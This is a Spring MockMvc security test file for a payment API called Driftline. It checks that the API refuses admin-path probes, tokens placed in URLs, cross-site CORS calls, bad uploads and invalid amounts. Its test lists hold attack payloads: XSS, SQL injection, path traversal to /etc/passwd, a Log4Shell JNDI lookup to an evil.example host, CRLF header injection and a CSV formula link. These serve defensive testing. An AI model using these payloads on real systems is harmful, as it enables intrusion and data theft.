package io.github.vanish073.driftline.app.security;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.verifyNoInteractions;
import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.options;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import io.github.vanish073.driftline.app.Roles;
import io.github.vanish073.driftline.app.ingest.IngestController;
import io.github.vanish073.driftline.app.kafka.EventPublisher;
import io.github.vanish073.driftline.app.merchant.DevBootstrap;
import io.github.vanish073.driftline.app.merchant.MerchantRegistry;
import io.github.vanish073.driftline.app.merchant.SecretCipher;
import io.github.vanish073.driftline.app.merchant.SecretRefresher;
import io.github.vanish073.driftline.app.observability.IngestMetrics;
import io.github.vanish073.driftline.app.observability.Tracing;
import io.github.vanish073.driftline.app.ops.OpsController;
import io.github.vanish073.driftline.app.pii.CustomerContacts;
import io.github.vanish073.driftline.core.event.EventType;
import io.github.vanish073.driftline.core.event.OrderPayload;
import io.github.vanish073.driftline.core.event.Sha256;
import io.github.vanish073.driftline.core.id.MerchantId;
import io.github.vanish073.driftline.core.id.OrderId;
import io.github.vanish073.driftline.core.money.Money;
import io.github.vanish073.driftline.core.matcher.MerchantTerms;
import io.github.vanish073.driftline.core.port.BreakRepo;
import io.github.vanish073.driftline.core.port.Clock;
import io.github.vanish073.driftline.core.port.PaymentRepo;
import io.github.vanish073.driftline.core.port.SettlementRepo;
import io.github.vanish073.driftline.core.port.Store;
import io.github.vanish073.driftline.core.port.Tx;
import io.github.vanish073.driftline.core.port.TxBody;
import io.github.vanish073.driftline.core.settlement.FeeSchedule;
import io.github.vanish073.driftline.store.postgres.PostgresDirectory;
import io.github.vanish073.driftline.store.postgres.SettlementInbox;
import io.github.vanish073.driftline.wire.ingest.MerchantContext;
import io.github.vanish073.driftline.wire.order.OrderEventCodec;
import io.github.vanish073.driftline.wire.order.OrderEventMessage;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.LocalDate;
import java.util.List;
import java.util.Optional;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.mockito.Mockito;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.webmvc.test.autoconfigure.WebMvcTest;
import org.springframework.context.annotation.Import;
import org.springframework.mock.web.MockHttpServletResponse;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.context.bean.override.mockito.MockitoBean;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.ResultActions;

/**
 * The common ways a payment API is attacked, each tried against Driftline's (Shift 11, DESIGN §14): hidden admin and
 * framework pages, credentials in the URL, a page framed or sniffed by a browser, another site calling the API from a
 * visitor's browser, script or SQL in identifiers, the wrong kind of file in the upload, and amounts that are negative,
 * zero or not whole paise. Forged and replayed webhooks, another merchant's ID in the URL (IDOR) and missing scopes have
 * their own tests in {@code IngestApiTest} and {@code OpsApiTest}.
 */
@WebMvcTest(controllers = {IngestController.class, OpsController.class})
@Import(SecurityConfiguration.class)
@ActiveProfiles(Roles.INGEST)
class AttackSurfaceTest {

    static final Instant NOW = Instant.parse("2026-11-15T10:00:00Z");
    static final MerchantId A = MerchantId.of("m_a");
    static final String TOKEN_A = "test-token-a_writer";
    static final String TOKEN_OPS = "test-token-ops_all";
    static final List<String> ALL_OPS_SCOPES = List.of("breaks:read", "breaks:resolve", "ledger:adjust",
            "secrets:write");

    @Autowired
    MockMvc mvc;

    @MockitoBean
    MerchantRegistry merchants;
    @MockitoBean
    EventPublisher publisher;
    @MockitoBean
    SettlementInbox inbox;
    @MockitoBean
    Clock clock;
    @MockitoBean
    Store store;
    @MockitoBean
    PostgresDirectory directory;
    @MockitoBean
    SecretCipher cipher;
    @MockitoBean
    SecretRefresher refresher;
    @MockitoBean
    CustomerContacts contacts;
    @MockitoBean
    IngestMetrics ingestMetrics;
    @MockitoBean
    Tracing tracing;

    @BeforeEach
    void world() {
        when(clock.now()).thenReturn(NOW);
        when(merchants.context(A)).thenReturn(Optional.of(new MerchantContext(A, 1, List.of(
                "test-only-webhook-secret-a-not-a-real-key".getBytes(StandardCharsets.US_ASCII)))));
        token(TOKEN_A, Optional.of(A), List.of("events:write", "settlement:write", "breaks:read"));
        token(TOKEN_OPS, Optional.empty(), ALL_OPS_SCOPES);
        when(merchants.merchants()).thenReturn(List.of(new MerchantTerms(A, 1, new FeeSchedule(200, 1_800), 1,
                LocalDate.parse("2026-11-14"))));
        Tx tx = Mockito.mock(Tx.class);
        BreakRepo breaks = Mockito.mock(BreakRepo.class);
        when(tx.breaks()).thenReturn(breaks);
        when(tx.payments()).thenReturn(Mockito.mock(PaymentRepo.class));
        when(tx.settlement()).thenReturn(Mockito.mock(SettlementRepo.class));
        when(breaks.forMerchant(any())).thenReturn(List.of());
        when(breaks.byId(anyString())).thenReturn(Optional.empty());
        when(tx.payments().find(any(), any())).thenReturn(Optional.empty());
        when(store.transact(anyString(), any())).thenAnswer(i -> i.getArgument(1, TxBody.class).run(tx));
    }

    void token(String token, Optional<MerchantId> merchant, List<String> scopes) {
        Sha256 hash = DevBootstrap.tokenHash(token);
        when(directory.token(hash)).thenReturn(Optional.of(new PostgresDirectory.ApiToken(hash, merchant, scopes,
                NOW.minusSeconds(60), NOW.plusSeconds(86_400), Optional.empty())));
    }

    static String orderEvent() {
        return new String(OrderEventCodec.encode(new OrderEventMessage(EventType.ORDER_CREATED, NOW.minusSeconds(60),
                new OrderPayload(OrderId.of("ord_1"), 1, Money.ofPaise(49_900), NOW.plusSeconds(900),
                        Optional.empty()))), StandardCharsets.UTF_8);
    }

    // ---- "What if someone opens /admin?" ------------------------------------------------------------------------

    static final List<String> PROBED_PATHS = List.of("/admin", "/admin/users", "/administrator", "/api/admin",
            "/v1/admin", "/actuator", "/actuator/env", "/actuator/heapdump", "/actuator/prometheus", "/actuator/health",
            "/swagger-ui.html", "/v3/api-docs", "/console", "/h2-console", "/.env", "/.git/config", "/debug",
            "/v1/tokens/../breaks", "/v1/breaks/..%2F..%2Fadmin");

    @Test
    void adminAndFrameworkPagesDoNotExistAndWithoutATokenNothingIsEvenListed() throws Exception {
        for (String path : PROBED_PATHS) {
            assertThat(mvc.perform(get(path)).andReturn().getResponse().getStatus())
                    .as("%s without a token: refused by the firewall (400) or unauthenticated (401)", path)
                    .isIn(400, 401);
            int status = mvc.perform(get(path).header("Authorization", "Bearer " + TOKEN_OPS))
                    .andReturn().getResponse().getStatus();
            assertThat(status).as("%s with an ops token holding every scope", path).isIn(400, 404);
        }
    }

    // ---- "API keys in the browser": a token belongs in a header, never in a URL ----------------------------------

    @Test
    void aTokenInTheUrlOrInAnyOtherHeaderShapeAuthenticatesNothing() throws Exception {
        for (String query : List.of("access_token", "token", "api_key", "apikey", "key", "bearer", "authorization")) {
            mvc.perform(get("/v1/breaks?" + query + "=" + TOKEN_OPS)).andExpect(status().isUnauthorized());
        }
        for (String value : List.of("bearer " + TOKEN_OPS, "Token " + TOKEN_OPS, "Basic " + TOKEN_OPS, TOKEN_OPS,
                "Bearer  " + TOKEN_OPS + " extra", "Bearer " + TOKEN_OPS + "\u0000")) {
            assertThat(mvc.perform(get("/v1/breaks").header("Authorization", value)).andReturn().getResponse()
                    .getStatus()).as("Authorization: %s", value.replace("\u0000", "\\0")).isIn(400, 401);
        }
        mvc.perform(get("/v1/breaks").header("X-Api-Key", TOKEN_OPS)).andExpect(status().isUnauthorized());
        mvc.perform(get("/v1/breaks").cookie(new jakarta.servlet.http.Cookie("token", TOKEN_OPS)))
                .andExpect(status().isUnauthorized());
    }

    // ---- browsers: no framing, no sniffing, no caching, no cross-site calls -------------------------------------

    static void securityHeaders(ResultActions result) throws Exception {
        result.andExpect(header().string("X-Content-Type-Options", "nosniff"))
                .andExpect(header().string("X-Frame-Options", "DENY"))
                .andExpect(header().string("Content-Security-Policy", "default-src 'none'; frame-ancestors 'none'"))
                .andExpect(header().string("Referrer-Policy", "no-referrer"))
                .andExpect(header().string("Cache-Control", org.hamcrest.Matchers.containsString("no-store")));
    }

    @Test
    void everyAnswerCarriesTheBrowserSecurityHeadersWhateverItsStatus() throws Exception {
        securityHeaders(mvc.perform(get("/v1/breaks").header("Authorization", "Bearer " + TOKEN_OPS))
                .andExpect(status().isOk()));
        securityHeaders(mvc.perform(get("/v1/breaks")).andExpect(status().isUnauthorized()));
        securityHeaders(mvc.perform(get("/v1/breaks/brk_nope").header("Authorization", "Bearer " + TOKEN_OPS))
                .andExpect(status().isNotFound()));
        securityHeaders(mvc.perform(post("/v1/merchants/m_a/order-events").content("{")
                        .header("Authorization", "Bearer " + TOKEN_A).header("Idempotency-Key", "k"))
                .andExpect(status().isBadRequest()));
    }

    @Test
    void anotherWebsiteGetsNoCorsGrantSoAVisitorsBrowserCannotCallTheApiForIt() throws Exception {
        MockHttpServletResponse preflight = mvc.perform(options("/v1/breaks")
                        .header("Origin", "https://evil.example")
                        .header("Access-Control-Request-Method", "GET")
                        .header("Access-Control-Request-Headers", "authorization"))
                .andReturn().getResponse();
        assertThat(preflight.getStatus()).isGreaterThanOrEqualTo(400);
        assertThat(preflight.getHeader("Access-Control-Allow-Origin")).isNull();
        MockHttpServletResponse read = mvc.perform(get("/v1/breaks").header("Origin", "https://evil.example")
                        .header("Authorization", "Bearer " + TOKEN_OPS))
                .andReturn().getResponse();
        assertThat(read.getHeader("Access-Control-Allow-Origin")).isNull();
        assertThat(read.getHeader("Access-Control-Allow-Credentials")).isNull();
    }

    // ---- "Script in the username", "query your database": hostile text in identifiers ---------------------------

    static final List<String> HOSTILE = List.of("<script>alert(1)</script>", "' OR '1'='1", "'; DROP TABLE breaks;--",
            "../../etc/passwd", "${jndi:ldap://evil.example/a}", "{{7*7}}", "m_a\r\nX-Injected: 1", "m_a%00");

    @Test
    void scriptOrSqlInAPathOrQueryIsRefusedAndNeverEchoedBack() throws Exception {
        for (String hostile : HOSTILE) {
            String encoded = java.net.URLEncoder.encode(hostile, StandardCharsets.UTF_8);
            for (String uri : List.of("/v1/breaks/" + encoded, "/v1/breaks?merchantId=" + encoded,
                    "/v1/breaks?state=" + encoded, "/v1/payments/" + encoded + "/timeline?merchantId=m_a",
                    "/v1/exports/breaks.csv?merchantId=" + encoded)) {
                MockHttpServletResponse r = mvc.perform(get(java.net.URI.create(uri))
                        .header("Authorization", "Bearer " + TOKEN_OPS)).andReturn().getResponse();
                assertThat(r.getStatus()).as(uri).isBetween(400, 404);
                assertThat(r.getContentAsString()).as(uri).doesNotContain(hostile).doesNotContain("<script");
                assertThat(r.getHeaderNames()).doesNotContain("X-Injected");
            }
            MockHttpServletResponse w = mvc.perform(post(java.net.URI.create(
                            "/v1/merchants/" + encoded + "/order-events")).content(orderEvent())
                            .header("Authorization", "Bearer " + TOKEN_A).header("Idempotency-Key", "k"))
                    .andReturn().getResponse();
            assertThat(w.getStatus()).as(hostile).isBetween(400, 404);
            assertThat(w.getContentAsString()).doesNotContain(hostile);
        }
        verifyNoInteractions(publisher);
    }

    @Test
    void scriptInABodyFieldIsRefusedBeforeItIsStoredOrPublished() throws Exception {
        for (String hostile : HOSTILE) {
            String body = orderEvent().replace("\"ord_1\"", toJsonString(hostile));
            MockHttpServletResponse r = mvc.perform(post("/v1/merchants/m_a/order-events").content(body)
                            .header("Authorization", "Bearer " + TOKEN_A).header("Idempotency-Key", "k"))
                    .andReturn().getResponse();
            assertThat(r.getStatus()).as(hostile).isEqualTo(400);
            assertThat(r.getContentAsString()).doesNotContain(hostile);
        }
        for (String hostile : HOSTILE) {   // the idempotency key becomes the event key, so it is held to the same rules
            mvc.perform(post("/v1/merchants/m_a/order-events").content(orderEvent())
                            .header("Authorization", "Bearer " + TOKEN_A)
                            .header("Idempotency-Key", hostile.replace("\r\n", " ")))
                    .andExpect(status().isBadRequest());
        }
        verifyNoInteractions(publisher);
    }

    static String toJsonString(String s) {
        StringBuilder b = new StringBuilder("\"");
        for (char c : s.toCharArray()) {
            switch (c) {
                case '"' -> b.append("\\\"");
                case '\\' -> b.append("\\\\");
                case '\r' -> b.append("\\r");
                case '\n' -> b.append("\\n");
                default -> b.append(c);
            }
        }
        return b.append('"').toString();
    }

    // ---- "Upload a non-photo in the photo part": the only upload is the settlement file --------------------------

    @Test
    void anythingButASettlementFileIsRefusedAndNothingIsStored() throws Exception {
        byte[] png = {(byte) 0x89, 'P', 'N', 'G', '\r', '\n', 0x1a, '\n', 0, 0, 0, 13, 'I', 'H', 'D', 'R'};
        byte[] jpeg = {(byte) 0xff, (byte) 0xd8, (byte) 0xff, (byte) 0xe0, 0, 16, 'J', 'F', 'I', 'F', 0};
        byte[] zip = {'P', 'K', 3, 4, 20, 0, 0, 0, 8, 0};
        byte[] exe = {'M', 'Z', (byte) 0x90, 0, 3, 0, 0, 0};
        byte[] html = "<html><script>alert(1)</script></html>".getBytes(StandardCharsets.UTF_8);
        byte[] csvFormula = "=HYPERLINK(\"https://evil.example\")\n".getBytes(StandardCharsets.UTF_8);
        byte[] utf16 = "H,DLSF,1".getBytes(StandardCharsets.UTF_16);
        for (byte[] file : List.of(png, jpeg, zip, exe, html, csvFormula, utf16, new byte[0])) {
            mvc.perform(post("/v1/merchants/m_a/settlement-files").content(file)
                            .header("Authorization", "Bearer " + TOKEN_A))
                    .andExpect(status().isBadRequest());
        }
        verify(inbox, never()).store(any(), any(), any());
    }

    // ---- "Order -1 items", "edit the price": amounts must be positive whole paise --------------------------------

    @Test
    void aNegativeZeroFractionalOrNonNumericAmountIsRefused() throws Exception {
        for (String amount : List.of("-100", "0", "-0", "499.5", "1e5", "\"49900\"", "null", "true", "[]",
                "99999999999999999999", "-9223372036854775808", "1000000000001", "9223372036854775807")) {
            String body = orderEvent().replace("\"amount_paise\":49900", "\"amount_paise\":" + amount);
            assertThat(body).contains("\"amount_paise\":" + amount);
            mvc.perform(post("/v1/merchants/m_a/order-events").content(body)
                            .header("Authorization", "Bearer " + TOKEN_A).header("Idempotency-Key", "k"))
                    .andExpect(status().isBadRequest());
        }
        verifyNoInteractions(publisher);
    }

    @Test
    void theLargestAcceptedAmountIsAcceptedAndOnePaisaMoreIsNot() throws Exception {
        String atLimit = orderEvent().replace("\"amount_paise\":49900", "\"amount_paise\":1000000000000");
        mvc.perform(post("/v1/merchants/m_a/order-events").content(atLimit)
                        .header("Authorization", "Bearer " + TOKEN_A).header("Idempotency-Key", "k"))
                .andExpect(status().isAccepted());
    }
}
